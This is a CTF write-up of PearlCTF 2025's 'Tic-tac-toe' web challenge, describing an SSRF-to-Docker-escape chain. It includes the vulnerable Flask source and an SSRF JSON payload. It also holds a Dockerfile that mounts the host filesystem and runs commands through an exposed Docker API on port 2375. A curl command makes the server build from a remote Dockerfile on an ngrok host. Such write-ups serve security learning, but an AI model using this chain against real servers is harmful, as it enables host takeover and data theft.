------------

### CTF-: PearlCTF 2025

-------------

![image](https://github.com/user-attachments/assets/e5d756ac-13c4-4aea-af6b-c663f279f432)

-------------

- Web
  - Tic-tac-toe

---------------

### TIC-TAC-TOE

---------------

![image](https://github.com/user-attachments/assets/3a66e18d-5a07-4e01-8d46-082ac5df5d33)

----------------

- Vulnerability-: SSRF-to-DockerEscape-to-RCE chain

-----------------

### Source Code-> Analysis for SSRF

-----------------

- app.py-:

```python3
from flask import Flask, render_template, request, jsonify
import requests, json
import url
import subprocess
import logging

app = Flask(__name__)
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

def wrap_response(resp):
    try:
        parsed = json.loads(resp)
    except json.JSONDecodeError:
        parsed = resp

    return {"body": parsed}

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/deploy")
def deploy():
    container_inspect = subprocess.run(["docker", "inspect", "game"], stdout=subprocess.PIPE)
    resp = json.loads(container_inspect.stdout)
    
    if len(resp) > 0:
        return jsonify({"status": 1})
    
    docker_cmd = ["docker", "run", "--rm", "-d", "-p", "8000:8000", "--name", "game", "b3gul4/tic-tac-toe"]
    subprocess.run(docker_cmd)
    
    return jsonify({"status": 0})

@app.route("/")
def game():
    return render_template("index.html")

@app.post("/")
def play():
    game = url.get_game_url(request.json)
    
    if game["error"]:
        return jsonify({"body": {"error": game["error"]}})
    
    try:
        if game["action"] == "post":
            resp = requests.post(game["url"], json=request.json)
            if resp.status_code < 200 or resp.status_code >= 300:
                logger.debug(resp.text)
                return jsonify({"body": {"error": "there was some error in game server"}})
        else:
            resp = requests.get(game["url"])
            if resp.status_code < 200 or resp.status_code >= 300:
                logger.debug(resp.text)
                return jsonify({"body": {"error": "there was some error in game server"}})
            
    except Exception as e:
        return jsonify({"body": {"error": "game server down"}})
        
    return jsonify(wrap_response(resp.text))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
```

- `Url.py`-:

```python3
import os

URL = "http://<domain>:<port>/<game_action>"

def is_valid_state(state):
    if len(state) != 9:
        return False
    
    for s in state:
        if s not in ["X", "O", "_"]:
            return False
    
    return True

def get_game_url(req_json):
    try:
        api = req_json["api"]
        keys = list(api.keys())
        
        url = URL.replace("<domain>", os.getenv("GAME_API_DOMAIN"))
        url = url.replace("<port>", os.getenv("GAME_API_PORT"))
        # The game api is going to have many more endpoints in future, I do not want to hardcode the action
        url = url.replace(keys[0], api[keys[0]])
        
        if not is_valid_state(req_json["state"]):
            return {"url": None, "action": None, "error": "Invalid state"}
        
        return {"url": url, "action": req_json["action"], "error": None}
    
    except Exception as e:
        print(e)
        return {"url": None, "action": None, "error": "Internal server error"}
```

- The index route calls function `get_game_url` and pass the json body to create a url.We just need to focus on `get_game_url()` to understand how the url is being created and trigger the `Server Side Request Forgery`.
The function picks key `api` from the dict and picks the keys from the dict with `keys()` object.Later, the url is replaced with environmental variables which will make the url look like this `http://localhost:8000/<game_action>`.The `<game_action>` will be replaced with the value of the first key.The `json` body must also contain an `action` key which will determine whether the request should be `get` or `post` and a state to mimic the `tic-tac-toe` state.The `state` must be a list containing 9 characters[string] and must consist of either `X','_' or '0'`.

```python3
import os

URL = "http://<domain>:<port>/<game_action>"

def is_valid_state(state):
    if len(state) != 9:
        return False
    
    for s in state:
        if s not in ["X", "O", "_"]:
            return False
    
    return True

def get_game_url(req_json):
    try:
        api = req_json["api"]
        keys = list(api.keys())
        
        url = URL.replace("<domain>", os.getenv("GAME_API_DOMAIN"))
        url = url.replace("<port>", os.getenv("GAME_API_PORT"))
        # The game api is going to have many more endpoints in future, I do not want to hardcode the action
        url = url.replace(keys[0], api[keys[0]])
        
        if not is_valid_state(req_json["state"]):
            return {"url": None, "action": None, "error": "Invalid state"}
        
        return {"url": url, "action": req_json["action"], "error": None}
    
    except Exception as e:
        print(e)
        return {"url": None, "action": None, "error": "Internal server error"}
```

- I triggered an `SSRF` by creating an object in this manner because we want the entire url to be replaced with our own url.The url will be like this `http://localhost:8000/<game_action>` after it gets replaced by the `url.py` script which will be the first key of the api `dict`.The key `http://localhost:8000/<game_action>` will be replaced with our malicious url which will be the Docker api url as seen below.

```json
{"api":{"http://localhost:8000/<game_action>":"http://localhost:2375/container/json"},"state":["X","X","X","X","X","X","X","X","X"],"action":"get"}
```

- Results will only be shown if the status code is between range `200` to `300`.

```python3
try:
        if game["action"] == "post":
            resp = requests.post(game["url"], json=request.json)
            if resp.status_code < 200 or resp.status_code >= 300:
                logger.debug(resp.text)
                return jsonify({"body": {"error": "there was some error in game server"}})
        else:
            resp = requests.get(game["url"])
            if resp.status_code < 200 or resp.status_code >= 300:
                logger.debug(resp.text)
                return jsonify({"body": {"error": "there was some error in game server"}})
            
    except Exception as e:
        return jsonify({"body": {"error": "game server down"}})
        
    return jsonify(wrap_response(resp.text))
```

-------------------------

### Dockerfile Analysis for DOCKER ESCAPE to RCE

-------------------------

- The Dockerfile will be based on the `alpine` image, it will install the `docker-cli`  and make the `/app` directory the home directory.The `requirements.txt` file will be copied into it and installed with `pip` followed by the `app.py` `url.py` and `templates`.The `flag.txt` will be copied to `/flag/`.Environmental variables will also be set,Host `tcp://localhost:2375` will be set to `DOCKER_HOST`,the `GAME_API_DOMAIN` will be set to `localhost` and the `GAME_API_PORT` wil be set to `8000`.Lastly, python `gunicorn` will be used to initialized the app.

```Docker
FROM python:3.9-alpine

RUN apk add --no-cache docker-cli 

WORKDIR /app

COPY requirements.txt .

RUN pip install -r requirements.txt

COPY ./templates ./templates
COPY app.py .
COPY url.py .
COPY flag.txt /flag/

ENV DOCKER_HOST="tcp://localhost:2375"
ENV GAME_API_DOMAIN="localhost"
ENV GAME_API_PORT="8000"

CMD ["gunicorn", "--bind", "0.0.0.0:80", "app:app", "--capture-output", "--log-level", "debug"]
```

- According to the docker file,Docker api is exposed on port `2375` which we can exploited to create containers,start containers,execute command and for malicious actions.We will be interacting with this internal url `localhost:2375` to load endpoints to buld a container,mount the host filesystem in it and execute commands on the container.With the aid of the `action` json key,we can make `get` and `post` requests to send data to the internal service.Mounting the host filesystem in the malicious container will allow us escape to the host filesystem.

-------------------

### Exploitation-:

------------------

- I created a malicious dockerfile to create a container and set the host filesystem to be mounted to point `/flag` in the malicious container.I got the idea of the script from [m0z](https://m0z.ie/research/2025-01-27-Developing-a-Docker-1-Click-RCE-chain-for-fun/).

```docker
RUN apk add --no-cache curl jq

RUN curl -X POST -H "Content-Type: application/json" -d '{"image": "alpine","Tty":true,"OpenStdin":true,"AutoRemove":true,"HostConfig":{"NetworkMode":"host","Binds":["/:/flag"]}}' http://localhost:2375/containers/create?name=shell
RUN curl -X POST http://localhost:2375/containers/shell/start
RUN exec_id=$(curl -s -X POST -H "Content-Type: application/json" -d '{"AttachStdin":false,"AttachStdout":true,"AttachStderr":true, "Tty":false, "Cmd":["mkdir", "/mnt/tmp/pwned"]}' http://localhost:2375/containers/shell/exec | jq -r .Id) && curl -X POST "http://localhost:2375/exec/$exec_id/start" -H "Content-Type: application/json" -d '{"Detach": false, "Tty": false}'
```

- Then, I made it accesible on the internet by tunnelling with ngrok.

![image](https://github.com/user-attachments/assets/7d925138-8ee4-431d-8bd1-7829d118d7e1)

- As explained in this [article](https://m0z.ie/research/2025-01-27-Developing-a-Docker-1-Click-RCE-chain-for-fun/) by M0z,an attacker can exploit dockerapi to build docker containers based  on dockerfiles hosted on the internet.It  might take time but it is building on the server.This can carried out with the `/build` endpoint.

```bash
❯ curl https://tic-tac-toe-8f5a953dc460f141.ctf.pearlctf.in/ -H "Content-Type: application/json" -d '{"api":{"http://localhost:8000/<game_action>":"http://localhost:2375/build?remote=http://4.tcp.eu.ngrok.io:12053/Dockerfile&networkmode=host"},"state":["X","X","X","X","X","X","X","X","X"],"action":"post"}'
{"body":""}
```

![image](https://github.com/user-attachments/assets/9f3ef135-7e14-4ac7-8fe2-5e5a7500317f)

- Them,we can execute commands on the container with `exec` endpoint.I grabbed the container's id from `/containers/json` endpoint which shows containers running on the server.

![image](https://github.com/user-attachments/assets/1312d564-d464-4f6c-baa6-5851f5ea6a43)

- I tried to read the flag at `/flag/flag/flag.txt`.To trigger a shell command on docker, an `exec` id has to be created which will be passed to the `/exec/[id]/start` endpoint to trigger the shell command.

![image](https://github.com/user-attachments/assets/eaa5b7f4-f6ec-47ce-9f97-fd37179b2de0)

- I read the output with the `/exec/[id]start` endpoint.

![image](https://github.com/user-attachments/assets/6ac103b6-488d-4a29-b8b6-314567dfd220)

- Flag-:```pearl{do_y0u_r34llY_kn0w_d0ck3r_w3ll?}```

-----------------

### THANKS FOR READING

------------------

### REFERENCES-:

-----------------

- [M0z](https://m0z.ie/research/2025-01-27-Developing-a-Docker-1-Click-RCE-chain-for-fun/)
- [Docker API documentation](https://docs.docker.com/reference/api/engine/version/v1.48/)

---------------


